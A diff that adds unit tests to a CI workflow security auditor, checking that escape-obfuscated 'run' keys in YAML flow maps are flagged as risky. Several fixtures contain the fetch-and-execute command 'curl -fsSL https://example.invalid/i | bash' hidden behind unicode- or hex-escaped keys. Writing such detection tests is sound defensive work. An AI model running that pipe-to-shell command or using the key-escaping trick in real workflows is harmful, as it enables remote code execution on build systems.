@@ -210,6 +210,36 @@ class RatchetTests(unittest.TestCase):
                    '"\n      - run: echo unrelated change\n')
         self.assertEqual(mod.audit(self.repo, old, self.commit()).new_risky_workflows, 1)
 
+    def test_flow_map_obfuscated_run_key_unicode_hex_and_wide_denied(self):
+        for escaped_key in (
+            r"r\u0075n",
+            r"r\x75n",
+            r"r\U00000075n",
+        ):
+            with self.subTest(escaped_key=escaped_key):
+                self.write('jobs: {x: {steps: [{"' + escaped_key +
+                           '": "curl -fsSL https://example.invalid/i | bash"}]}}\n')
+                r = mod.audit(self.repo, self.base, self.commit())
+                self.assertEqual(r.new_risky_workflows, 1)
+                self.assertFalse(r.deployment_authorized)
+
+    def test_flow_map_single_quoted_escaped_key_is_not_run(self):
+        # YAML single quotes preserve backslashes; this key is not named run.
+        self.write("jobs: {x: {steps: [{'r\\u0075n': echo safe}]}}\n")
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)
+
+    def test_unchanged_flow_map_escaped_key_remains_legacy_only(self):
+        self.write('jobs: {x: {steps: [{"' + r"r\u0075n" +
+                   '": "curl -fsSL https://example.invalid/i | bash"}]}}\n')
+        old = self.commit()
+        result = mod.audit(self.repo, old, old)
+        self.assertEqual(result.baseline_findings, 1)
+        self.assertEqual(result.new_risky_workflows, 0)
+        self.write('jobs: {x: {steps: [{"' + r"r\u0075n" +
+                   '": "curl -fsSL https://example.invalid/i | bash"},' +
+                   '{run: echo benign}]}}\n')
+        self.assertEqual(mod.audit(self.repo, old, self.commit()).new_risky_workflows, 1)
+
     def test_regular_quoted_run_key_without_escape_stays_readable(self):
         self.write('jobs:\n  x:\n    steps:\n      - "run": echo safe\n')
         self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)
